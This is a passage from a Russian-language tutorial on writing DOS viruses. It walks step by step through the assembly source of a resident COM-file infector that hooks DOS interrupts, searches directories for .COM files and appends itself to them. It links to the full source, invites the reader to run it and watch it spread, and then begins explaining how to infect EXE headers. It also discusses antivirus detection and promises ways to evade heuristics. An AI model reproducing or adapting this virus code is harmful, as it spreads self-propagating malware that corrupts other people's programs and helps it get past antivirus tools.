<p>Теперь настало время переписать в память код вируса и подготовить его к работе в резидентном режиме:</p>
<pre class="source">
               mov word ptr vir,9090h ;Подготавливаем
               mov tg_infect,0        ;вирус к рези-
                                      ;дентной работе

               mov es,ax              ;И копируем его
               xor di,di              ;в память...
               mov cx,vir_len
    prg_copy:  mov bl,byte ptr vir[di]
               mov byte ptr es:[di],bl
               inc di
               loop prg_copy
</pre>
<p>В самом начале нужно сбросить в ноль переменную "tg_infect", чтобы вирус не занимался заражением файлов, пока его об этом не попросят. Далее, в первые два байта кода вируса, который мы собираемся записывать в память, следует записать две команды NOP, или код 9090h ( см п. 2.2 ).</p>
<p>Теперь тело вируса просто копируется в блок памяти, сегментный адрес которого задан в регистре AX.</p>
<h4><a name="p12c">2.12 Устанавливаем вектора прерываний на вирусные обработчики</a></h4>
<p>Все подготовительные действия выполнены, и нам только осталось заменить адреса системных обработчиков прерываний Int 21h, Int 13h, Int 28h и Int 2fh на адреса вирусных обработчиков,после чего необходимо передать управление зараженной программе. Это мы сейчас и сделаем:</p>
<pre class="source">
               xor bx,bx              ;Устанавливаем
                                      ;вектора преры-
	       mov es,bx              ;ваний на вирус-
               cli                    ;ные обработчики
               mov di,084h
               mov word ptr es:[di],to_new_21h
               mov es:[di+2],ax       ; Int 21h

               mov di,0bch
               mov word ptr es:[di],to_new_2fh
               mov es:[di+2],ax       ; Int 2fh

	       mov di,04ch
               mov word ptr es:[di],to_new_13h
               mov es:[di+2],ax       ; Int 13h

	       mov di,0a0h
               mov word ptr es:[di],0
               mov es:[di+2],ax       ; Int 28h
               sti

               jmp fresh_bytes        ;Установка
                                      ;завершена. ..
</pre>
<p>Модификация векторов прерываний в особых комментариях не нуждается. А команда "jmp fresh_bytes" передает управление на программный код,выполняющий восстановление исходных трех байт программы - жертвы.</p>
<p>Таким образом, мы разработали секцию инициализации нашего вируса. И поэтому настало время перейти к созданию резидентной секции. Все оставшиеся пункты этой главы будут посвящены именно разработке резидентной части.</p>
<h4><a name="p12d">2.13 Пишем резидентную часть</a></h4>
<p>Начало резидентной части мы создали в первых пунктах главы (см п. 2.5). А теперь просто продолжим, и допишем до конца "заразную" часть вирусной программы:</p>
<pre class="source">
    infect:    push cs                ;DS = CS. ..
               pop ds

               mov ax,ds              ;TSR - коррекция
               sub ax,11h             ;DS. ..
               mov ds,ax

               cmp tg_13h,0           ;INT 13h
                                      ;выполняется ?
               je cs:all_right        ;Нет. ..
               jmp cs:exit_zarasa     ;Да - на выход
</pre>
<p>Сразу за меткой "infect" мы записали команды которые корректируют содержимое DS при работе в резидентном режиме. Если этого не сделать, то относительный адрес каждой ячейки памяти придется уменьшать на 110h (см п. 2.5).Далее вирус проверяет значение переменной "tg_13h". Дело в том, что резидентный вирус обязательно должен заражать файлы, находясь в памяти, и поэтому без обращения к диску в резидентном режиме нам не обойтись. Такое обращение, естественно, должно происходить только в те моменты,когда никакие другие программы не работают с диском. Если это условие не соблюдается, непременно возникнет программный конфликт, что приведет к неприятным последствиям. Особенно это относится к тем случаям,когда на машине установлен какой-нибудь кэш (например, SMARTDRIVE или HYPERDISK). В этом случае может случиться так, что вирус и кэш попробуют обратиться к диску одновременно, а это недопустимо!</p>
<p>Решить проблему помогает введение переменной "tg_13h". Она принимает значение " 1 ", когда к диску выполняется обращение, или значение " 0 ", если в данный момент обращения к диску нет. Для инициализации переменной используется специальный "фильтр" прерывания Int 13h, который будет описан ниже.</p>
<p>Итак, если " tg_13h " равна " 1 ",вирус возвращает управление прерванной программе,в противном случае работа вирусного кода продолжается.</p>
<h4><a name="p12e">2.14 Заражаем COM - файл</a></h4>
<p>В случае, если прерывание Int 13h не выполняется, можно заняться поиском подходящего COM - файла и его заражением. Этот процесс практически не отличается от действий нерезидентного вируса, и поэтому мы просто используем разработанный ранее блок, не останавливаясь подробно на его работе:</p>
<pre class="source">
    all_right: mov ah,2fh             ;Получим текущую
               int 21h                ;DTA ( ES : BX )

               mov bp,bx

	       mov cx,80h             ;Сохраним эту
	       lea si,dta_save        ;DTA. ..
               mov di,bp
    save_dta:
	       mov al,byte ptr es:[di]
	       mov [si],al
	       inc si
               inc di
	       loop cs:save_dta

    find_first:                       ;Найдем первый
	       mov ah,4eh             ;файл. ..
	       mov cx,00100111b
	       lea dx,maska
	       int 21h
	       jnc cs:retry_2
	       jmp restore_dta

    find_next: mov ah,3eh             ;Закроем непод-
	       int 21h                ;ходящий файл
	       jnc cs:retry_1
	       jmp cs:restore_dta

    retry_1:   mov ah,4fh             ;Найдем следую-
	       int 21h                ;щий. ..
	       jnc cs:retry_2
	       jmp cs:restore_dta

    retry_2:   mov cx,12              ;Сотрем старое
	       lea si,fn              ;имя в буфере
    destroy_name:
	       mov byte ptr [si],0
	       inc si
	       loop cs:destroy_name

               xor si,si              ;И запишем туда
 	       mov di,bp              ;новое. ..
    copy_name: mov al,byte ptr es:[di+1eh]
	       cmp al,0
	       je cs:check_command
	       mov byte ptr fn[si],al
	       inc si
               inc di
	       jmp cs:copy_name

    check_command:
                                      ;Проверим, не
                                      ;является - ли
               call cs:search         ;файл командным
               cmp inside,1           ;процессором...
               je cs:retry_1

               mov ax,3d02h           ;Откроем этот
	       lea dx,fn              ;файл. ..
	       int 21h
	       jnc cs:save_bytes
	       jmp cs:restore_dta

    save_bytes:                       ;Считаем первые
	       mov bx,ax              ;три байта
	       mov ah,3fh
	       mov cx,3
	       lea dx,old_bytes
	       int 21h
	       jnc cs:found_size
	       jmp cs:close

    found_size:mov di,bp
               cmp word ptr es:[di+01ch],0
               jne cs:more_64K        ;Найдем его раз-
	       mov ax,es:[di+01ah]    ;мер. ..

    count_size:mov si,ax              ;Вычислим
                                      ;смещения. ..
	       cmp ax,64000
	       jna cs:smallest
    more_64K:  jmp cs:find_next
    smallest:  test ax,000fh
	       jz cs:krat_16
	       or ax,000fh
	       inc ax
    krat_16:   mov di,ax
	       sub ax,3
	       mov byte ptr new_bytes[1],al
	       mov byte ptr new_bytes[2],ah
	       mov ax,di
	       mov cl,4
	       shr ax,cl
	       dec ax
	       mov byte ptr add_to_ds,al
	       mov byte ptr add_to_ds+1,ah

	       mov ax,4200h           ;Считаем послед-
	       xor cx,cx              ;ний байт. ..
	       dec si
	       mov dx,si
	       int 21h
	       jnc cs:read_last
	       jmp cs:close

    read_last:
	       mov ah,3fh
	       mov cx,1
	       lea dx,last
	       int 21h
	       jc cs:close

	       cmp last,'1'           ;Индикатор зара-
	       jne cs:write_vir       ;жения. ..
	       jmp cs:find_next

    write_vir: mov ax,4200h           ;Запишем начало
	       xor cx,cx              ;вируса. ..
	       mov dx,di
	       int 21h
	       jc cs:close

               mov ah,40h
               mov cx,2
               lea dx,end_file
               int 21h
               jc cs:close
                                      ;И остальную
               mov ah,40h             ;часть. ..
               mov cx,vir_len - 2
               lea dx,vir + 2
               int 21h
               jc cs:close

    write_bytes:                      ;Запишем первые
	       mov ax,4200h           ;три байта
	       xor cx,cx
	       xor dx,dx
	       int 21h
	       jc cs:close

               mov ah,40h
               mov cx,3
               lea dx,new_bytes
               int 21h

    close:     mov ah,3eh             ;Закроем зара-
               int 21h                ;женный файл

    restore_dta:
               mov cx,80h             ;Восстановим DTA
	       lea si,dta_save
               mov di,bp
    dta_fresh:
               mov al,[si]
	       mov byte ptr es:[di],al
	       inc si
               inc di
	       loop cs:dta_fresh
</pre>
<p>Как видите, в созданный ранее фрагмент были внесены некоторые изменения, в которых мы сейчас и разберемся.</p>
<p>Поскольку вирус будет заражать файлы в резидентном режиме, он будет пользоваться DTA активной в данный момент программы,что приведет к ее разрушению. Чтобы этого не происходило, нужно сохранить ее в области данных вируса, а после завершения работы вируса - восстановить. Получить адрес текущей DTA можно с помощью функции DOS 2Fh, которая и используется вирусом.</p>
<p>Следующее отличие - наш вирус проверяет, является - ли найденный файл командным процессором COMMAND.COM. Для этого используется процедура SEARCH, которая возвращает INSIDE = 1, если найден командный процессор, или INSIDE = 0 - в противном случае.</p>
<p>Так как иногда COM-файлы на самом деле имеют EXE - формат, их размер может превышать 64 Кбайта, и следует проверить, не является - ли найденный нами файл именно таким, иначе при заражении он будет безнадежно испорчен. С этой целью вирус считывает из DTA слово по смещению 01Ch, и сравнивает его с нулем. Если это слово равно нулю,размер файла не превышает 64 Кбайт,и его можно заражать. Кроме того, неплохо было бы проверить формат файла. Для этого нужно проверить его первые два байта. Если мы имеем дело с EXE - файлом, то указанные байты содержат ASCII - коды символов " M " и " Z ". Думаю, читатель сам при желании допишет несколько необходимых для этого команд.</p>
<p>И последнее - мы выяснили, (<a href="#p125">см. п. 2.5</a>) что первыми двумя байтами, которые должны записываться в конец файла, должна быть команда перехода на секцию инициализации вируса. Эту функцию выполняют команды, записанные за меткой " write_vir ". Сам код команды перехода хранится в области " end_file ".</p>
<p>* Не спешите торжествовать по поводу того, что автор этой книги не смог сделать вирус, заражающий COMMAND.COM, и поэтому, вероятно, является "чайником". На самом деле вирус отлично работает с командным процессором и при этом не глюкует. Защита введена только для вашего же блага, так как заражение COMMAND.COM " нестандартным " вирусом - крайне неприятное событие. Подготовленный читатель без труда снимет такую " защиту ".</p>
<h4><a name="p12f">2.15 Восстанавливаем регистры</a></h4>
<p>Перед тем, как передать управление прерванной программе, необходимо восстановить значения регистров, которые имели место при получении управления резидентной программой:</p>
<pre class="source">
    exit_zarasa:                      ;Восстановим
                                      ;регистры
                                      ;процессора. ..
               pop es
               pop ds
               pop bp
               pop di
               pop si
               pop dx
               pop cx
               pop bx
               pop ax
	       popf
               mov ss,cs:ss_save-110h ;Восстановим
               mov sp,cs:sp_save-110h ;стек. ..
               iret
</pre>
<p>Кроме того, вирус восстанавливает стек прерванной программы, без чего дальнейшая работа невозможна.</p>
<h4><a name="p12g">2.16 Пишем обработчики прерываний</a></h4>
<p>Для начала выясним, какие прерывания и с какой целью наш вирус будет перехватывать.</p>
<p>Во-первых, необходимо перехватить прерывание Int 21h. Дело в том, что наш вирус является резидентным, и должен заражать файлы при тех или иных событиях в вычислительной системе. Очень многие вирусы активизируются, например, при смене текущего диска или каталога. Этот метод является весьма удачным, и мы реализуем именно его. Но для этого нужно знать, когда именно выполняются смена каталога или диска. Единственный способ узнать о таком событии - это перехватить прерывание Int 21h на себя, и при каждом его вызове проверять, какая именно функция вызывается. Так мы и сделаем.</p>
<p>Во-вторых, нам не обойтись без перехвата Int 13h (см п. 2.13).</p>
<p>В-третьих, поскольку наш вирус будет пользоваться функциями DOS, которые работают с диском в резидентном режиме, необходимо знать, когда можно безопасно обращаться к этим функциям. Для этого следует перехватить прерывание Int 28h, которое всегда вызывается только при выполнении DOS реентерабельной секции своего кода. Иными словами, при возникновении прерывания Int 28h можно смело пользоваться любыми функциями DOS.</p>
<p>Далее, для проверки наличия вирусного кода в памяти наш вирус будет использовать так называемое мультиплексное прерывание - Int 2fh, и поэтому мы должны перехватить и его (см п. 2.7).</p>
<p>И, наконец, мы должны написать обработчик критической ошибки. Она возникает,например, если мы попытаемся записать информацию на вынутую из дисковода дискету. Наш вирус должен перехватить прерывание по критической ошибке (Int 24h) и выполнить его обработку.</p>
<h4><a name="p12h">2.17 Обработчик Int 13h</a></h4>
<p>Как мы уже выяснили, этот обработчик должен записывать в ячейку " tg_13h " значение " 1 ", если в данный момент выполняется прерывание Int 13h, или значение " 0 " - в противном случае.</p>
<p>К сожалению, в MS DOS отсутствует какое - либо средство, позволяющее узнать, когда именно активно прерывание Int 13h. И поэтому единственный способ решения этой задачи - установка на Int 13h так называемого " фильтра ", который отслеживал бы все вызовы вышеуказанного прерывания.</p>
<p>Самое простое решение - это перехватить Int 13h на себя, а в самом обработчике вызвать системный обработчик как дальнюю процедуру. Конечно, перед этим нужно записать в " tg_13h" единицу - это будет индикатором выполнения Int 13h в данный момент. Когда системный обработчик выполнится, управление вновь получит " фильтр ". Поскольку Int 13h уже выполнилось, можно сбросить в "0" переменную tg_13h.</p>
<p>Итак:</p>
<pre class="source">
    ; _______________________________________________
    ;|                                               |
    ;| Напишем новые обработчики INT 13h, INT 21h,   |
    ;| INT 24h и INT 2fh. ..                         |
    ;|_______________________________________________|

               to_new_13h equ $-vir

    new_13h:   jmp cs:start_13h

    tg_13h     db   0
    ax_13h     dw   0
    cs_13h     dw   0
    ip_13h     dw   0

    start_13h: mov cs:tg_13h - 110h,1
               pushf
               db 9ah                 ;Код команды
    old_13h    dw 0                   ; " CALL ". ..
    old_13h_2  dw 0
               mov cs:ax_13h - 110h,ax;Поместим новый
               pop ax                 ;флаг на место
               mov cs:ip_13h - 110h,ax;старого ( CF )
               pop ax
               mov cs:cs_13h - 110h,ax
               pop ax
               pushf
               mov ax,cs:cs_13h - 110h
               push ax
               mov ax,cs:ip_13h - 110h
               push ax
               mov ax,cs:ax_13h - 110h
               mov cs:tg_13h - 110h,0
               iret
</pre>
<p>Здесь константа " to_new_13h " показывает смещение от начала вирусного кода до начала обработчика.</p>
<p>Хотелось бы обратить ваше внимание на одну особенность. Она состоит в том, что прерывания Int 21h и Int 13h возвращают в регистре AX код ошибки, а бит CF регистра флагов используется как индикатор этой ошибки.</p>
<p>Пусть, например, при получении фильтром управления бит CF имел значение FLAG 1, а регистры CS и IP имели значения CS 1 и IP 1.Тогда команда "pushf" занесет значение FLAG 1 в стек. Команда "call" поместит в стек значения CS 1 и IP 1,после чего управление получит системный обработчик. Этот обработчик занесет в стек значение FLAG 2, и при своем завершении выполнит команду "iret". Команда "iret" снимет с вершины стека значения IP 1,CS 1 и FLAG2. Теперь уже наш фильтр сбросит в " 0 " переменную "tg_13h",и командой " iret " передаст управление прерванной программе. Но дело в том, что эта команда извлечет из стека значения IP и CS, которые имели место в момент вызова прерывания Int 13h, а также регистр флагов FLAG 1. Таким образом, из стека будет извлечен FLAG 1 вместо FLAG 2! Чтобы этого не произошло, мы должны поместить в стек FLAG 2 вместо FLAG 1. Именно для этого предназначены команды, записанные после ячейки " old_13h_2 ". Работа этих команд особых пояснений не требует. Мы просто "добираемся" до нужной ячейки в стеке, последовательно считывая предшествующие. Можно, конечно, написать более эффективный фрагмент,зато выбранный нами метод достаточно прост.</p>
<h4><a name="p12i">2.18 Обработчик Int 21h</a></h4>
<p>Рассмотрим теперь создание обработчика прерывания Int 21h. Как мы договорились, он должен помещать "единицу" в ячейку " tg_infect ", если DOS выполняет смену текущего каталога или диска (см п. 2.5). Поэтому напишем " фильтр ", который будет проверять, какая именно функция DOS вызвана в тот или иной момент:</p>
<pre class="source">
    ;-------------------------------------------------

               to_new_21h equ $-vir

    new_21h:   jmp cs:start_21h

    tg_infect  db   0

    start_21h: pushf
               push di
               push es
               xor di,di              ;Перехват
               mov es,di              ;INT 24h в рези-
               mov di,90h             ;дентном режиме
               mov word ptr es:[di],to_new_24h
               mov es:[di+2],cs
               cmp ah,03bh            ;Активизировать
                                      ;вирус ?
               jne cs:new_cmp_1
               mov cs:tg_infect-110h,1;Да - взводим
                                      ;триггер. ..
    new_cmp_1: cmp ah,00eh
               jne cs:to_jump
               mov cs:tg_infect - 110h,1
    to_jump:   pop es
               pop di
               popf
               db 0eah                ;Переход на ста-
    old_21h    dw 0                   ;рый обработчик
    old_21h_2  dw 0                   ;INT 21h. ..
</pre>
<p>Поскольку при вызове функции DOS в регистре AH задается ее номер, достаточно просто проанализировать его и " выловить " нужные значения.Наш вирус будет реагировать на смену текущего каталога (AH=03Bh), и смену текущего диска (AH=0Eh). Эти числа и пытается обнаружить " фильтр ".</p>
<p>Далее - так как нам нужно всего лишь определить, какая функция DOS вызвана, нет смысла после завершения системного обработчика передавать управление обратно в " фильтр ". По этой причине отпадает необходимость сложных " манипуляций " со стеком, которые мы проделывали в предыдущем пункте.</p>
<p>Помимо решения своей конкретной задачи, написанный нами обработчик используется для перехвата прерывания Int 24h.Делается это прямым обращением к таблице векторов прерываний. Так же перехватывает прерывания и секция инициализации при установке вируса в память. Правда, вы можете спросить, зачем потребовалась такая сложная методика перехвата, и почему бы не выполнить его в секции инициализации? Дело в том, что такой прием будет "работать" только в MS DOS. WINDOWS 95, например, постоянно восстанавливает вектор Int 24h, что делает бессмысленным изменение вектора " только один раз ". Трудно сказать, зачем в WINDOWS 95 принято восстанавливать вектор. Вероятно, это сделано для надежности работы системы. При создании резидентного EXE-вируса мы поговорим еще об одной " странности " этой популярной операционной системы, которая помешает нам сделать вирусную программу "невидимой" для антивирусных средств.</p>
<h4><a name="p12j">2.19 Обработчик Int 24h</a></h4>
<p>Этот обработчик должен устанавливать собственную реакцию на критическую ошибку. Вызывается он очень редко, поэтому просто сделаем так,чтобы при появлении ошибки не происходило " зависание ". Для этого достаточно вернуть управление прерванной программе, поместив предварительно в регистр AL код "3":</p>
<pre class="source">
    ;-------------------------------------------------

               to_new_24h equ $ - vir

    new_24h:   mov al,3               ;Вернем програм-
               iret                   ;ме управление
</pre>
<h4><a name="p12k">2.20 Обработчик Int 2Fh</a></h4>
<p>Напишем обработчик Int 2Fh. Мы договорились использовать это прерывание для проверки наличия вируса в памяти. Напомним, что секция инициализации для решения указанной задачи вызывает Int 2Fh c такими параметрами:</p>
<pre class="source">
     AX = 0F000h
     BX = 01997h. 
</pre>
<p>Если вирус уже инсталлирован в память, его обработчик должен вернуть AL = 0FFh, это значение и анализирует секция инициализации при запуске зараженшой программы. Исходя из всего сказанного, можно написать такой фрагмент:</p>
<pre class="source">
    ;-------------------------------------------------
               to_new_2fh equ $ - vir

    new_2fh:   pushf
               cmp ax,0f000h
	       jne cs:not_our
	       cmp bx,1997h
	       jne cs:not_our
	       mov al,0ffh
	       popf
               iret

    not_our:   popf
               db 0eah
    old_2fh    dw 0
    old_2fh_2  dw 0
</pre>
<p>Если вызывается прерывание Int 2Fh с параметрами, отличными от AX = 0F000h и BX = 01997h, вирусный обработчик просто возвращает управление системному. В противном случае управление передается прерванной программе, причем в этом случае AL будет равно 0FFh.</p>
<h4><a name="p12l">2.21 Обработчик Int 28h</a></h4>
<p>Строго говоря, мы его уже написали (<a href="#p125">см. п. 2.5</a>, п. 2.6 и т.д.). Именно он занимается поиском и заражением файлов,пользуясь для этого функциями DOS. Но так как эти функции используются тогда, когда активно прерывание Int 28h, ничего страшного произойти не должно.</p>
<h4><a name="p12m">2.22 Область данных вируса</a></h4>
<p>Теперь мы можем привести все данные, с которыми работает наш вирус:</p>
<pre class="source">
    ;/***********************************************/

    ;Data area

    old_bytes   db   0e9h             ;Исходные три
                dw   vir_len + 0dh    ;байта. ..

    dta_save    db   128 dup (0)      ;Массив для DTA

    maska       db   '*.com',0        ;Маска для поис-
                                      ;ка. ..

    fn          db   12 dup (' '),0   ;Место для имени
                                      ;файла

    new_bytes   db   0e9h             ;Код команды
                                      ;" JMP. .."
                db   00h              ;HIGH
                db   00h              ;LOW
                                      ;Он записывается
                                      ;в файл вместо
                                      ;первых трех
                                      ;байт. ..

    end_file    db   0ebh             ;Первые два бай-
                db   push_len         ;та вируса в
                                      ;файле (команда
                                      ;перехода на се-
                                      ;кцию инициали-
                                      ;зации. ..

    ss_save     dw   0                ;Буфера для SS
    sp_save     dw   0                ;и SP. ..

    help_word   dw   0                ;Промежуточная
                                      ;ячейка. 

    com_com     db   'COMMAND'        ;Имя командного
                                      ;процессора. ..

    inside      db   0                ;Ячейка - инди-
                                      ;катор. ..

    last        db   0                ;Последний байт

    to_newstack equ  $ - vir          ;Смещение к сте-
                                      ;ку. ..
    newstack    dw   70 dup ( 0 )     ;Новый стек. ..
</pre>
<h4><a name="p12n">2.23 Процедура идентификации COMMAND.COM</a></h4>
<p>Приведем текст процедуры, которой пользуется наш вирус. Эта процедура проверяет,является - ли найденный нами файл командным процессором COMMAND.COM и возвращает INSIDE = 1, если был найден именно командный процессор.</p>
<p>Итак:</p>
<pre class="source">
    ;-------------------------------------------------

    search     proc                   ;Процедура
               push ax                ;сравнивает
               push cx                ;строки. ..
               mov inside,1
               lea di,fn
               lea si,com_com
               mov cx,7
    new_cmp:   mov al,byte ptr ds:[si]
               cmp byte ptr ds:[di],al
               jne cs:not_equal
               inc di
               inc si
               loop cs:new_cmp
               jmp cs:to_ret
    not_equal: mov inside,0
    to_ret:    pop cx
               pop ax
               ret
    search     endp
</pre>
<p>Работа процедуры достаточно ясна и в комментариях не нуждается.</p>
<h4><a name="p12o">2.24 Завершаем программу</a></h4>
<p>В принципе, завершить эту программу можно так же, как и предыдущую:</p>
<pre class="source">
                db   '1'              ;Последний байт
                                      ;вируса в файле
    vir_len     equ  $-vir            ;Длина вируса в
                                      ;байтах. ..
    vir_par     equ  ( $-vir + 0fh ) / 16
                                      ;И в параграфах

    prg_end:   mov ax,4c00h           ;Выход в DOS
               INT 21H                ;только для за-
                                      ;пускающей прог-
                                      ;раммы. ..

	        db '1'                ;И ее последний
                                      ;байт. ..

    prg ends                          ;Стандартное
    end start                         ;" окончание "
                                      ;ASM - программы
</pre>
<p>Единственное отличие заключается в том, что потребовалось ввести константу " vir_par ". Она нужна для расчета необходимой длины блока памяти при инсталляции вируса и в некоторых других вычислениях.</p>
<h4><a name="p12p">2.25 Текст резидентного COM - вируса</a></h4>
<p>Теперь мы можем привести полный текст резидентной программы - вируса:</p>
<p><a href="files/vik00_ru/comtsr.asm">Исходный текст comtsr.asm (18K)</a></p>
<h4><a name="p12q">2.26 Комментарии</a></h4>
<p>В отличие от предыдущего,разработанный в этой главе вирус может отыскивать файлы для заражения на всем жестком диске и даже на дискетах. Это делает его довольно заразным и быстро распространяющимся. Поэтому сложность " конструкции " окупается эффективностью работы вирусного кода.</p>
<p>Вместе с тем, наш вирус имеет определенный недостаток. Ведь его обнаруживает такая распространенная программа, как DOCTOR WEB !В следующей части будет рассказано о способах разработки вирусов, против которых алгоритм эвристического анализа оказывается малоэффективным.</p>
<h4><a name="p12r">2.27 Испытание вируса</a></h4>
<p>Для исследования работы вируса откомпилируйте его исходный текст для получения COM - файла. После чего запустите этот COM - файл.</p>
<p>"Пройдитесь" по различным каталогам и понаблюдайте, как вирус заражает файлы при смене текущего каталога. Попробуйте перейти на другой диск и проследите за действиями вируса. И последнее, проверьте, заражается ли командный процессор. Все вышеуказанные действия нужно проводить очень аккуратно и не рисковать важными программами, так как вирус, который мы изготовили, весьма заразный, из-за чего у вас могут быть неприятности.</p>
<p>Кроме того, очень советую вам " пройти " зараженную программу отладчиком до точки входа в программный код.</p>
<p>И, наконец,при инсталлированном в память машины вирусном коде запустите программу DOCTOR WEB в режиме поиска резидентных вирусов. Вы убедитесь, что наш вирус обнаруживается как неизвестный.</p>
<h2><a name="p2">Часть 2. EXE - вирусы</a></h2>
<h3><a name="p21">Глава 1. Разработка нерезидентного EXE - вируса</a></h3>
<h4><a name="p211">1.1 Формат EXE - файла на диске</a></h4>
<p>Каждый EXE - файл, хранимый на диске, состоит из заголовка, таблицы настройки и собственно программных кодов и данных.В заголовке содержится информация для настройки адресов и установки значений регистров процессора, которая используется при загрузке программы. Поскольку понимание структуры заголовка очень важно для изучения данной и последующей глав, мы рассмотрим ее уже сейчас. Итак, заголовок EXE - файла при хранении его на диске имеет следующий формат:</p>
<table border="1" cellspacing="0" cellpadding="0" summary="заголовок EXE-файла">
<tr><td>Байты 0, 1</td><td>Содержат код 4D5Ah, или " MZ "</td></tr>
<tr><td>Байты 2, 3</td><td>Содержат остаток от деления размера загрузочного модуля на 512</td></tr>
<tr><td>Байты 4, 5</td><td>Содержат размер файла в 512-ти байтовых страницах, округленный в большую сторону</td></tr>
<tr><td>Байты 6, 7</td><td>Содержат число элементов таблицы настройки адресов</td></tr>
<tr><td>Байты 8, 9</td><td>Содержат размер заголовка в параграфах</td></tr>
<tr><td>Байты 0A,0B</td><td>Содержат минимальное число дополнительных параграфов,которые нужны загруженной программе</td></tr>
<tr><td>Байты 0C,0D</td><td>Содержат максимальное число дополнительных параграфов</td></tr>
<tr><td>Байты 0E,0F</td><td>Содержат смещение в параграфах сегмента стека в загрузочном модуле; назовем его SS0</td></tr>
<tr><td>Байты 10,11</td><td>Содержат значение регистра SP, которое устанавливается перед передачей управления программе ( SP0 )</td></tr>
<tr><td>Байты 12,13</td><td>Содержат контрольную сумму EXE-файла</td></tr>
<tr><td>Байты 14,15</td><td>Содержат значение регистра IP, которое устанавливается перед передачей управления программе ( IP0 )</td></tr>
<tr><td>Байты 16,17</td><td>Содержат смещение в параграфах сегмента кода в загрузочном модуле, или CS0</td></tr>
<tr><td>Байты 18,19</td><td>Содержат расстояние в байтах от начала файла до первого элемента таблицы настройки адресов</td></tr>
<tr><td>Байты 1A,1B</td><td>Содержат "0", если данная часть программы является резидентной, или отличное от нуля число - если данная часть является оверлейной</td></tr>
</table>
<p>Заметим, что контрольная сумма определяется суммированием всех слов, содержащихся в файле, без учета переполнения.При этом она практически нигде не используется.</p>
<h4><a name="p212">1.2 Загрузка и выполнение EXE - программы</a></h4>
<p>Действия MS DOS при запуске EXE - программы отличаются от действий при запуске программы типа COM, хотя в обоих случаях операционная система использует одну и ту же функцию EXEC. Действия этой функции при запуске EXE - программы выглядят так:</p>
<ol>
<li>Запускаемой программе отводится вся свободная в данный момент оперативная память. Сегментная часть начального адреса этой памяти обычно называется начальным сегментом программы.</li>
<li>По нулевому смещению в сегменте, определяемом начальным сегментом программы,EXEC строит PSP программы. Заполняет PSP по-прежнему операционная система, а его размер, как и для COM - программы, равен 256 байт.</li>
<li>Сразу вслед за PSP загружается сама EXE - программа. Причем в память помещается исключительно загрузочный модуль, а заголовок и таблица настройки в память не копируются.После этого выполняется так называемая настройка адресов. Ее суть состоит в следующем:
<p>Некоторые команды (например, команды далекого перехода или вызова процедуры, расположенной в другом программном сегменте) требуют указания не только смещения, но и сегмента адреса. Компоновщик строит EXE - модуль относительно некоторого "начального" адреса,но ведь в MS DOS программы могут загружаться в произвольную область памяти! Поэтому при загрузке программы к каждому сегментному адресу прибавляется значение начального сегмента программы. Этот процесс и называют настройкой адресов. У вас может возникнуть вопрос, откуда MS DOS знает, где расположены требующие настройки элементы. Для получения такой информации система использует таблицу настройки, которая находится в файле по некоторому смещению от его начала. Само смещение хранится в заголовке в байтах 18h, 19h.</p></li>
<li>EXEC выполняет настройку регистров процессора. Обозначим начальный сегмент программы буквами NS0. Тогда устанавливаемые значения регистров будут выглядеть так:
<pre class="source">    
    DS = ES = NS0
    CS = NS0 + 10h + CS0
    IP = IP0
    SS = NS0 + 10h + SS0
    SP = SP0
</pre>
<p>CS0, SS0, IP0 и SP0 берутся загрузчиком из заголовка EXE - файла, а NS0 становится известным в процессе загрузки.</p></li>
<li>Теперь загруженную EXE - программу можно исполнить. Для этого EXEC передает управление по адресу CS:IP.</li>
</ol>
<p>Стоит заметить, что размер EXE - файла в MS DOS не ограничивается размером одного сегмента и может быть очень большим ( примерно 65535*512 = 33553920 байт!). Правда,для построения очень больших EXE-программ используется оверлейная структура.При исполнении программы, имеющей оверлейную структуру, она не загружается в память целиком.Вместо этого в память помещается только ее резидентная часть, которая по мере необходимости подгружает те или иные оверлейные фрагменты.</p>
<h4><a name="p213">1.3 Как вирус может заразить EXE - файл</a></h4>
<p>Как и при заражении COM - программ, при заражении EXE-файлов вирусный код может записываться в конец, начало или в середину файла.Запись в конец файла, как и в предыдущем случае,реализуется наиболее просто,и кроме того,предохраняет от многих трудностей при отладке. Поэтому мы создадим вирус, работающий имено по такому принципу. Для того,чтобы при старте зараженной программы код вируса получил управление, следует соответствующим образом модифицировать заголовок EXE - файла. Для этого исходные значения CS0 и IP0 заменяются на точку входа в вирусный код, а значения SS0 и SP0 "переключаются" на собственный стек вируса. Кроме того, поскольку при заражении изменяются длина загрузочного модуля и длина файла, необходимо скорректировать поля заголовка по смещению 02h, 03h, а также 04h, 05h. Вот и все. Может показаться, что создать вирус,заражающий EXE-файлы, намного сложнее, чем COM - вирус. Однако это не так. Прочтите эту главу, и вы убедитесь в этом!</p>
<h4><a name="p214">1.4 Работа вируса в зараженной программе</a></h4>
<p>Рассмотрим теперь действия вируса при получении им управления. Итак, вирус функционирует по такому алгоритму:</p>
<ol>
<li>Ищет на диске подходящий EXE-файл.</li>
<li>Записывает свое тело в конец этого файла.</li>
<li>Корректирует заголовок заражаемой программы следующим образом:
<ol type="a">
<li>Вместо исходных CS0 и IP0 заражаемой программы записываются значения, обеспечивающие передачу управления вирусному коду при запуске программы.</li>
<li>Исходные SS0 и SP0 заменяются на значения, обеспечивающие переключение на собственный стек вируса.</li>
<li>Корректируется остаток от деления размера загрузочного модуля на 512.</li>
<li>Поскольку при заражении длина файла увеличивается, корректируется размер файла в страницах (одна страница равна 512 байт).</li>
</ol>
<p>Естественно, перед корректировкой вирус обязан сохранить исходные параметры заголовка -ведь они потребуются при передаче управления вирусному коду. После коррекции заголовок записывается на диск.</p></li>
<li>Выполняет вредные действия, предусмотренные автором.</li>
<li>Определяет значения CS, IP, SS и SP,необходимые для правильной работы программы,из которой стартовал вирус.</li>
<li>Передает управление зараженной программе. Для этого вирус использует команду безусловного дальнего перехода.Адрес перехода задается вычисленными CS и IP. После этого начинается обычное выполнение программы.</li>
</ol>
<h4><a name="p215">1.5 Начало работы</a></h4>
<p>Как и COM - вирус, EXE - вирус лучше разрабатывать в формате COM. Это убережет нас от многих ненужных трудностей. Поэтому напишем стандартное начало COM программы:</p>
<pre class="source">
    prg segment
       assume cs:prg,ds:prg,es:prg,ss:prg
          org 100h
</pre>
<p>Как вы помните, директива "assume cs:prg,ds:prg,es:prg,ss:prg" назначает сегментные регистры сегменту с именем PRG, а директива "org 100h" резервирует место для PSP вирусной программы.</p>
<h4><a name="p216">1.6 Вирус получает управление</a></h4>
